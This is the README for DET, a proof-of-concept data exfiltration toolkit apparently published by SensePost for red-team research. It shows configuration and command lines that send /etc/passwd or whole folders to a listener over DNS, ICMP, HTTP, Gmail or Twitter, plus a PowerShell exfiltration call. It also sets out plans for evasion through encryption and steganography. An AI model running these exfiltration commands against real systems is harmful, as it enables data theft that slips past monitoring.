DET (extensible) Data Exfiltration Toolkit
=======

DET (is provided AS IS), is a proof of concept to perform Data Exfiltration using either single or multiple channel(s) at the same time. 
The idea was to create a generic toolkit to plug any kind of protocol/service.

# Slides

DET has been presented at [BSides Ljubljana](https://bsidesljubljana.si/) on the 9th of March 2016 and the slides will be available here. Soon.

# Example usage (ICMP plugin)

## Server-side: 

[![asciicast](https://asciinema.org/a/18rjfp59rc7w27q7vlzlr96qv.png)](https://asciinema.org/a/18rjfp59rc7w27q7vlzlr96qv)

## Client-side: 

[![asciicast](https://asciinema.org/a/9m7ovlh7e4oyztx8e3fxyqsbl.png)](https://asciinema.org/a/9m7ovlh7e4oyztx8e3fxyqsbl)


# Usage while combining two channels (Gmail/Twitter)

## Server-side: 

[![asciicast](https://asciinema.org/a/9lfpo9m47y5sglvdd1kyb1lwj.png)](https://asciinema.org/a/9lfpo9m47y5sglvdd1kyb1lwj)

## Client-side: 

[![asciicast](https://asciinema.org/a/bfstssgptxd41ncces4981cn6.png)](https://asciinema.org/a/bfstssgptxd41ncces4981cn6)


# Installation

Clone the repo: 

```bash
git clone https://github.com/sensepost/DET.git
```

Then: 

```bash
pip install -r requirements.txt --user
```

# Configuration

In order to use DET, you will need to configure it and add your proper settings (eg. SMTP/IMAP credentials and so on). 
A configuration example file has been provided and is called: ```config-sample.json``` 

```json
{
    "plugins": {
        "http": {
            "target": "192.168.1.101",
            "port": 8080
        },
        "google_docs": {
            "target": "192.168.1.101",
            "port": 8080,
        },
        "dns": {
            "key": "google.com",
            "target": "192.168.1.101",
            "port": 53
        },
        "gmail": {
            "username": "dataexfil@gmail.com",
            "password": "ReallyStrongPassword",
            "server": "smtp.gmail.com",
            "port": 587
        },
        "tcp": {
            "target": "192.168.1.101",
            "port": 6969
        },
        "twitter": {
            "username": "PaulWebSec",
            "CONSUMER_TOKEN": "XXXXXXXXX",
            "CONSUMER_SECRET": "XXXXXXXXX",
            "ACCESS_TOKEN": "XXXXXXXXX",
            "ACCESS_TOKEN_SECRET": "XXXXXXXXX"
        },
        "icmp": {
            "target": "192.168.1.101"
        }
    },
    "XOR_KEY": "THISISACRAZYKEY",
    "sleep_time": 10
}
```

# Usage

## Help usage

```bash
python det.py -h
usage: det.py [-h] [-c CONFIG] [-f FILE] [-d FOLDER] [-p PLUGIN] [-e EXCLUDE]
              [-L]

Data Exfiltration Toolkit (SensePost)

optional arguments:
  -h, --help  show this help message and exit
  -c CONFIG   Configuration file (eg. '-c ./config-sample.json')
  -f FILE     File to exfiltrate (eg. '-f /etc/passwd')
  -d FOLDER   Folder to exfiltrate (eg. '-d /etc/')
  -p PLUGIN   Plugins to use (eg. '-p dns,twitter')
  -e EXCLUDE  Plugins to exclude (eg. '-e gmail,icmp')
  -L          Server mode
```

## Server-side: 

To load every plugin:

```bash
python det.py -L -c ./config.json -p twitter,gmail
```

To load *only* twitter and gmail modules: 

```bash
python det.py -L -c ./config.json -p twitter,gmail
```

To load every plugin and exclude DNS: 

```bash
python det.py -L -c ./config.json -e dns
```

## Client-side:

To load every plugin: 

```bash
python det.py -c ./config.json -f /etc/passwd
```

To load *only* twitter and gmail modules: 

```bash
python det.py -c ./config.json -p twitter,gmail -f /etc/passwd
```

To load every plugin and exclude DNS: 

```bash
python det.py -c ./config.json -e dns -f /etc/passwd
```
And in PowerShell (HTTP module): 

```powershell
PS C:\Users\user01\Desktop>
PS C:\Users\user01\Desktop> . .\http_exfil.ps1
PS C:\Users\user01\Desktop> HTTP-exfil 'C:\path\to\file.exe'
```

# Modules

So far, DET supports multiple protocols, listed here: 

- [X] HTTP(S)
- [X] ICMP
- [X] DNS
- [X] SMTP/IMAP (eg. Gmail)
- [X] Raw TCP
- [X] PowerShell implementation (HTTP, DNS, ICMP, SMTP (used with Gmail))

And other "services": 

- [X] Google Docs (Unauthenticated)
- [X] Twitter (Direct Messages)

# Experimental modules

So far, I am busy implementing new modules which are almost ready to ship, including: 

- [ ] Skype (95% done)
- [ ] Tor (80% done)
- [ ] Github (30/40% done)

# Limitations

Data so far is not encrypted and just HEX/XOR'ed which can be detected if deep analysis is done. I plan to add encryption soon (such as [Public-key cryptography](https://en.wikipedia.org/wiki/Public-key_cryptography))

# Roadmap

- [ ] Compression (extremely important!)
- [ ] Add proper encryption (eg. AES-256)
- [ ] Proper data obfuscation and integrating [Markovobfuscate](https://github.com/bwall/markovobfuscate)
- [ ] FTP, FlickR [LSB Steganography](https://github.com/RobinDavid/LSB-Steganography) and Youtube modules

# References

Some pretty cool references/credits to people I got inspired by with their project: 

- [https://github.com/nullbind/Powershellery/](Powershellery) from Nullbind.
- [https://github.com/ytisf/PyExfil](PyExfil), truely awesome. 
- [https://github.com/m57/dnsteal](dnsteal) from m57.
- [https://github.com/3nc0d3r/NaishoDeNusumu](NaishoDeNusumu) from 3nc0d3r.
- WebExfile from Saif El-Sherei

# Contact/Contributing

You can reach me on Twitter [@PaulWebSec](https://twitter.com/PaulWebSec). 
Feel free if you want to contribute, clone, fork, submit your PR and so on.

# License

DET is licensed under a Creative Commons [Attribution-NonCommercial-ShareAlike 4.0 International](http://creativecommons.org/licenses/by-nc-sa/4.0/). Permissions beyond the scope of this license may be available at [info@sensepost.com](info@sensepost.com)